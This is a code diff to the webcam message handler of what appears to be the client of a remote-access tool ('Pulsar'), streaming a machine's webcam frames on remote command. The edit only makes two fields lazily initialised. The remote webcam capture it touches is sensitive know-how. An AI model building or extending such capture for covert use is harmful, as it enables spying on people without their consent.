@@ -22,7 +22,19 @@ namespace Pulsar.Client.Messages
         private Bitmap _webcam = null;
         private ISender _clientMain;
         private Thread _captureThread;
-        private readonly WebcamHelper _webcamHelper = new WebcamHelper();
+        private WebcamHelper _webcamHelper;
+
+        private WebcamHelper WebcamHelper
+        {
+            get
+            {
+                if (_webcamHelper == null)
+                {
+                    _webcamHelper = new WebcamHelper();
+                }
+                return _webcamHelper;
+            }
+        }
 
         private CancellationTokenSource _cancellationTokenSource;
 
@@ -39,7 +51,19 @@ namespace Pulsar.Client.Messages
         private float _lastFrameRate = 0f;
         private bool _sendFrameRateNext = false;
 
-        private MemoryStream _reusableStream = new MemoryStream();
+        private MemoryStream _reusableStream;
+
+        private MemoryStream ReusableStream
+        {
+            get
+            {
+                if (_reusableStream == null)
+                {
+                    _reusableStream = new MemoryStream();
+                }
+                return _reusableStream;
+            }
+        }
 
         public override bool CanExecute(IMessage message) => message is GetWebcam ||
                                                              message is GetAvailableWebcams;
@@ -83,7 +107,7 @@ namespace Pulsar.Client.Messages
             {
                 try
                 {
-                    _webcamHelper.StartWebcam(message.DisplayIndex);
+                    WebcamHelper.StartWebcam(message.DisplayIndex);
                 }
                 catch (Exception ex)
                 {
@@ -93,7 +117,7 @@ namespace Pulsar.Client.Messages
                 }
                 Debug.WriteLine("Starting remote webcam session");
 
-                var webcamBounds = _webcamHelper.GetBounds();
+                var webcamBounds = WebcamHelper.GetBounds();
                 var resolution = new Resolution { Height = webcamBounds.Height, Width = webcamBounds.Width };
 
                 try
@@ -155,7 +179,7 @@ namespace Pulsar.Client.Messages
             {
                 try
                 {
-                    _webcamHelper.StopWebcam();
+                    WebcamHelper.StopWebcam();
                 }
                 catch (Exception ex)
                 {
@@ -287,7 +311,7 @@ namespace Pulsar.Client.Messages
         {
             try
             {
-                _webcam = _webcamHelper.GetLatestFrame();
+                _webcam = WebcamHelper.GetLatestFrame();
 
                 if (_webcam == null)
                 {
@@ -319,16 +343,16 @@ namespace Pulsar.Client.Messages
                 _webcamData = processedBitmap.LockBits(new Rectangle(0, 0, processedBitmap.Width, processedBitmap.Height),
                     ImageLockMode.ReadWrite, processedBitmap.PixelFormat);
 
-                _reusableStream.Position = 0;
-                _reusableStream.SetLength(0);
+                ReusableStream.Position = 0;
+                ReusableStream.SetLength(0);
 
                 if (_streamCodec == null) throw new Exception("StreamCodec can not be null.");
                 _streamCodec.CodeImage(_webcamData.Scan0,
                     new Rectangle(0, 0, processedBitmap.Width, processedBitmap.Height),
                     new Size(processedBitmap.Width, processedBitmap.Height),
-                    processedBitmap.PixelFormat, _reusableStream);
+                    processedBitmap.PixelFormat, ReusableStream);
 
-                return _reusableStream.ToArray();
+                return ReusableStream.ToArray();
             }
             catch (Exception ex)
             {
